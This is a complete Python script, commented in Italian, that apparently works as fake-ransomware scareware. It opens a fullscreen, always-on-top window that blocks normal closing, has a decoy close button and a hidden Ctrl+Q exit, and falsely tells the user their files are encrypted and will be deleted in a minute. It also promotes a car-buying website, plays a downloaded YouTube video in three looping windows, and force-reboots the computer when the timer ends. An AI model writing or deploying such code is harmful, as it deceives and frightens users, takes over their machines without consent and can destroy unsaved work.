import os
import sys
import platform
import threading
import subprocess
import webbrowser
import tkinter as tk
from yt_dlp import YoutubeDL

# --- CONFIGURAZIONE ---
YOUTUBE_URL = "https://www.youtube.com/watch?v=jjcCdIkr_TY"  # Link del video YouTube
FILE_VIDEO = "ciao.mp4"                                      # Nome del file MP4 locale
RITARDO_AVVIO_VIDEO_MS = 4000                                # 4 secondi di attesa prima del primo video
DURATA_TIMER_SECONDI = 60                                    # Timer impostato a 1 minuto
NUMERO_FINESTRE_VIDEO = 3                                    # Numero di finestre video da aprire


def elimina_video():
    """Rimuove il file video scaricato se esiste sul disco"""
    try:
        if os.path.exists(FILE_VIDEO):
            os.remove(FILE_VIDEO)
            print(f"File {FILE_VIDEO} eliminato correttamente.")
    except Exception as e:
        print(f"Errore durante l'eliminazione del video: {e}")


def riavvia_sistema():
    """Esegue il riavvio del PC in modo sicuro e multipiattaforma usando subprocess"""
    os_name = platform.system()
    try:
        if os_name == "Windows":
            subprocess.run(["shutdown", "/r", "/t", "0"], check=True)
        elif os_name in ["Linux", "Darwin"]:
            subprocess.run(["shutdown", "-r", "now"], check=True)
    except Exception as e:
        print(f"Errore durante il riavvio del sistema: {e}")


class App:
    def __init__(self, root):
        self.root = root
        self.root.title("Attenzione")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')

        # Lista per tracciare i processi dei lettori video aperti
        self.video_processes = []

        # Intercetta e blocca la chiusura standard (Alt+F4 / tasto X)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Scorciatoia segreta per chiudere l'app: CTRL + Q
        self.root.bind('<Control-q>', self.chiudi_app)

        # Download del video in background
        threading.Thread(target=self.download_youtube_video, daemon=True).start()

        center_frame = tk.Frame(root, bg='black')
        center_frame.pack(expand=True)

        # 1. Titolo Principale
        tk.Label(
            center_frame, 
            text="I TUOI FILE SONO STATI CRIPTATI E SARANNO ELIMINATI TRA 1 MINUTO", 
            font=("Arial", 32, "bold"), 
            fg="red", 
            bg="black",
            justify="center",
            wraplength=1100
        ).pack(pady=15)

        # 2. Testo e Link
        tk.Label(
            center_frame, 
            text="Intanto scopri quanto vale la tua auto su noicompriamoauto.it", 
            font=("Arial", 16), 
            fg="white", 
            bg="black",
            justify="center"
        ).pack(pady=10)

        link_label = tk.Label(
            center_frame, 
            text="Clicca qui", 
            font=("Arial", 18, "underline", "bold"), 
            fg="#00aaff", 
            bg="black", 
            cursor="hand2",
            justify="center"
        )
        link_label.pack(pady=10)
        link_label.bind("<Button-1>", lambda e: webbrowser.open("https://www.noicompriamoauto.it"))

        # 3. Timer
        self.seconds_left = DURATA_TIMER_SECONDI
        self.label_timer = tk.Label(
            center_frame, 
            text=f"Tempo rimanente: {self.format_time(self.seconds_left)}", 
            font=("Arial", 22, "bold"), 
            fg="yellow", 
            bg="black",
            justify="center"
        )
        self.label_timer.pack(pady=30)

        # 4. Pulsante finto
        self.btn_close = tk.Button(
            center_frame, 
            text="Chiudi", 
            font=("Arial", 14), 
            bg="#747474", 
            fg="#FFFFFF",
            padx=20,
            pady=3
        )
        self.btn_close.pack(pady=10)

        # Avvia il timer e la sequenza dei video
        self.update_timer()
        self.root.after(RITARDO_AVVIO_VIDEO_MS, self.start_video_sequence)

    def chiudi_video_processi(self):
        """Termina forzatamente tutti i processi dei lettori video aperti dallo script"""
        for proc in self.video_processes:
            try:
                proc.terminate()
                proc.kill()
            except Exception:
                pass
        self.video_processes.clear()

        if sys.platform == "win32":
            try:
                subprocess.run(
                    ["taskkill", "/F", "/IM", "vlc.exe"], 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL
                )
            except Exception:
                pass

    def chiudi_app(self, event=None):
        self.chiudi_video_processi()
        elimina_video()
        self.root.destroy()

    def format_time(self, total_seconds):
        minutes = total_seconds // 60
        seconds = total_seconds % 60
        return f"{minutes}:{seconds:02d}"

    def download_youtube_video(self):
        ydl_opts = {
            'format': '18/b/best',
            'outtmpl': FILE_VIDEO,
            'quiet': True,
            'no_warnings': True,
            'extractor_args': {
                'youtube': {
                    'player_client': ['android', 'web']
                }
            }
        }
        try:
            with YoutubeDL(ydl_opts) as ydl:
                ydl.download([YOUTUBE_URL])
        except Exception as e:
            print(f"Errore durante il download del video: {e}")

    def start_video_sequence(self):
        if not os.path.exists(FILE_VIDEO):
            self.root.after(1000, self.start_video_sequence)
            return

        self.open_video_window(count=0)

    def open_video_window(self, count):
        if count >= NUMERO_FINESTRE_VIDEO:
            return

        vlc_paths = [
            r"C:\Program Files\VideoLAN\VLC\vlc.exe",
            r"C:\Program Files (x86)\VideoLAN\VLC\vlc.exe"
        ]
        vlc_executable = next((path for path in vlc_paths if os.path.exists(path)), None)

        proc = None
        if vlc_executable:
            proc = subprocess.Popen([vlc_executable, "--loop", FILE_VIDEO])
        elif sys.platform == "win32":
            proc = subprocess.Popen(["cmd", "/c", "start", "", FILE_VIDEO], shell=True)
        elif sys.platform == "darwin":
            proc = subprocess.Popen(["open", FILE_VIDEO])
        else:
            proc = subprocess.Popen(["xdg-open", FILE_VIDEO])

        if proc:
            self.video_processes.append(proc)

        # Mantiene la finestra nera in primo piano
        self.root.lift()

        # Programma l'apertura della finestra successiva dopo 500 ms
        self.root.after(500, lambda: self.open_video_window(count + 1))

    def update_timer(self):
        """Aggiorna il timer ogni secondo, chiude i video, elimina il file e riavvia allo scadere."""
        if self.seconds_left > 0:
            self.label_timer.config(text=f"Tempo rimanente: {self.format_time(self.seconds_left)}")
            self.seconds_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            # Allo scadere del timer chiude i video, elimina il file e riavvia
            self.chiudi_video_processi()
            elimina_video()
            riavvia_sistema()


if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()